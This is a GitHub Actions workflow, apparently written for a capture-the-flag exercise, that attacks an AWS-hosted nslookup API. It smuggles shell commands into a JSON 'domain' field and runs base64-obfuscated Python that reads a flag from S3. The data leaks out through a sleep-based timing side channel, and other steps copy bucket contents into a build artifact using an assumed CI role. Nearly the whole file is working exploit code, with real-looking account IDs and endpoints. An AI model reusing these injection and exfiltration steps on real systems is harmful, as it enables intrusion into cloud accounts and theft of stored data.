name: recon

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  id-token: write   # required to request the OIDC JWT from GitHub
  contents: read

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Who am I
        run: aws sts get-caller-identity

      - name: EXPLOIT - boto3 write flag to platform-bucket (15s = success)
        run: |
          B64=""
          INJECT="x; echo $B64 | base64 -d | python3 #"
          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
          START=$(date +%s%N)
          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" -d @payload.json
          END=$(date +%s%N)
          echo "Exploit timing: $(( (END - START) / 1000000 ))ms"

      - name: Read flag via cicdRole and save as artifact
        run: |
          echo "=== List platform-bucket ==="
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --recursive
          echo
          echo "=== Download flag-boto3.txt ==="
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag-boto3.txt flag.txt
          echo "=== Raw bytes (xxd) ==="
          xxd flag.txt
          echo "=== ASCII ==="
          cat flag.txt
          echo
          echo "=== Base64 ==="
          base64 flag.txt

      - name: Upload flag artifact
        uses: actions/upload-artifact@v4
        with:
          name: flag
          path: flag.txt

      - name: NIBBLE EXFIL byte[0] hi-nibble (fallback if S3 GET above failed)
        run: |
          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMF0+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
          INJECT="x; echo $B64 | base64 -d | python3 #"
          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
          START=$(date +%s%N)
          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" -d @payload.json
          END=$(date +%s%N)
          MS=$(( (END - START) / 1000000 ))
          echo "byte[0] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"

